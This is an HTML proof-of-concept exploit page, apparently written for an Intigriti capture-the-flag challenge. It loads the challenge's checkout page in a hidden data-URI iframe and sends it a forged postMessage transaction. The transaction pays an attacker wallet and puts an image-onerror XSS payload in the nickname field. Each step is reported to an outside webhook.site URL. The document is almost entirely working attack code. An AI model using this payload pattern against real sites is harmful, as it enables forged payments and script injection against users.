<!DOCTYPE html>
<html><head><title>Data Exploit</title></head>
<body>
<h2>Exploit</h2>
<pre id=log></pre>
<script>
const WEBHOOK = 'https://webhook.site/159bea5f-e890-4760-b166-513ff8c724fc';
const WALLET = '16472226db03703a192aa383237035a69f';
const log = document.getElementById('log');

function report(s) { log.textContent += '\n' + s; fetch(WEBHOOK + '?s=' + s).catch(()=>{}); }

report('1_START');

const iframe = document.createElement('iframe');
iframe.style.display = 'none';

// Data URI - same-origin
iframe.src = 'data:text/html,' + encodeURIComponent(`
    <!DOCTYPE html>
    <body>
    <iframe id="x" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1"></iframe>
    <script>
        const WEBHOOK = '${WEBHOOK}';
        const WALLET = '${WALLET}';
        
        fetch(WEBHOOK + '?s=2_DATA_LOADED').catch(()=>{});
        
        document.getElementById('x').onload = function() {
            fetch(WEBHOOK + '?s=3_IFRAME_LOADED').catch(()=>{});
            
            setTimeout(function() {
                this.contentWindow.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: WALLET,
                        currency: '1337COIN',
                        amount: 1,
                        nickname: '<img src=x onerror="alert(\\'gigawatz\\')">'
                    }
                }, 'https://challenge-0126.intigriti.io');
                
                fetch(WEBHOOK + '?s=4_POSTMESSAGE').catch(()=>{});
            }, 2000);
        };
    <\/script>
    </body>
</html>
`);

document.body.appendChild(iframe);
report('2_DATA_IFRAME_ADDED');
</script>
</body>
</html>
